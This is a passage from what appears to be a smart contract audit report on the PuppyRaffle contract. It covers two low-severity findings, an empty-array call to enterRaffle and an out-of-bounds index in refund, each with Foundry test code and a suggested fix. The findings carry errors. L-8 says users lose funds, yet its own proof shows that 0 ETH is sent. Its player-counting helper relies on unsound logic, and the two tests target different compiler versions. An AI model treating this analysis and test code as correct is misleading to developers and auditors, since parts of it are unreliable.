    revert(string(abi.encodePacked("PuppyRaffle: NFT minting failed: ", reason)));
}
```

## [L-8]. Array Limits issue in PuppyRaffle::enterRaffle

## Description
The contract does not validate array inputs in the `enterRaffle` function. If an empty array is provided, the transaction will succeed but no players will be added, and the entrance fee will still be collected.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // Check if value is at least entranceFee * newPlayers.length
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );
    
    // Add players to the raffle
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    // ... rest of the function
}
```

## Impact
If a user accidentally provides an empty array to `enterRaffle`, they will lose their funds without any players being added to the raffle. The function will still execute successfully, potentially resulting in user confusion and loss of funds. Additionally, no event is emitted for the empty array, making it difficult to track what happened.

## Proof of Concept
1. A user calls `enterRaffle` with an empty array `[]`
2. The require statement passes because `msg.value == entranceFee * 0 == 0`
3. The loop doesn't execute because `newPlayers.length == 0`
4. The user has sent 0 ETH, no players are added, but the transaction succeeds
5. This can confuse users who might think something happened when nothing did

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ArrayLimitsTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = address(1);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            duration
        );
    }

    function testEmptyArrayInput() public {
        // Create an empty array
        address[] memory emptyPlayers = new address[](0);
        
        // Record the initial player count
        uint256 initialPlayerCount = getPlayerCount();
        
        // Call enterRaffle with empty array and 0 ETH
        puppyRaffle.enterRaffle{value: 0}(emptyPlayers);
        
        // Check that player count hasn't changed
        uint256 finalPlayerCount = getPlayerCount();
        assertEq(initialPlayerCount, finalPlayerCount, "Player count should not change");
        
        // Transaction succeeded but nothing meaningful happened
        console.log("Transaction succeeded with empty array");
    }
    
    // Helper function to get player count
    function getPlayerCount() internal view returns (uint256) {
        uint256 count = 0;
        bool countingActive = true;
        
        while (countingActive) {
            try puppyRaffle.getActivePlayerIndex(address(bytes20(keccak256(abi.encodePacked(count))))) returns (uint256) {
                count++;
            } catch {
                countingActive = false;
            }
        }
        
        return count;
    }
}

## Suggested Mitigation
Add a validation check to ensure that the newPlayers array is not empty:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // Add this check
    require(newPlayers.length > 0, "PuppyRaffle: Must provide at least one player");
    
    // Existing checks
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );
    
    // Rest of the function remains unchanged
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    // Check for duplicates...
    
    emit RaffleEnter(newPlayers);
}
```

## [L-9]. Array Limits issue in PuppyRaffle::refund

## Description
The `refund` function allows any user to claim a refund for a player at a specific index, but only checks if the caller is equal to the player address at that index. It doesn't validate that the index is within the bounds of the players array:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex]; // This could revert with an out-of-bounds error
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

If a user provides an index that is out of bounds, the function will revert with an unhelpful error message.

## Impact
If a user provides an index that exceeds the length of the players array, the transaction will revert with a generic out-of-bounds error rather than a clear, user-friendly message. This leads to a poor user experience and may cause confusion. While this is not a critical security vulnerability, it represents a robustness issue in the contract's design.

## Proof of Concept
1. The players array has a length of 10
2. A user calls refund(15) with an index that exceeds the array bounds
3. Instead of checking the bounds and providing a clear error message, the contract will revert with a generic out-of-bounds error
4. This makes debugging difficult for users and frontend applications

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ArrayBoundsTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1 ether;
    address owner = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            duration
        );
        
        // Set up a few players
        address[] memory players = new address[](3);
        players[0] = address(10);
        players[1] = address(20);
        players[2] = address(30);
        
        vm.deal(address(this), entranceFee * 3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }
    
    function testOutOfBoundsRefund() public {
        // Try to refund with an out-of-bounds index
        uint256 outOfBoundsIndex = 10; // There are only 3 players
        
        // Impersonate one of the players
        vm.startPrank(address(10));
        
        // This will revert with an unhelpful error
        vm.expectRevert(); // We can't easily check for specific out-of-bounds errors
        puppyRaffle.refund(outOfBoundsIndex);
        
        vm.stopPrank();
        
        // For demonstration, show a refund with a valid index
        vm.startPrank(address(10)); // First player
        puppyRaffle.refund(0); // Valid index
        vm.stopPrank();
        
        // Verify the refund worked
        assertEq(puppyRaffle.getPlayer(0), address(0), "Player should be refunded");
    }
}

## Suggested Mitigation
Add an explicit check to ensure the index is within bounds:

```solidity
function refund(uint256 playerIndex) public {
    // Add bounds check
    require(playerIndex < players.length, "PuppyRaffle: Invalid player index");
    
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before transfer (to prevent reentrancy)
    players[playerIndex] = address(0);
    
    // Transfer funds after state update
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```



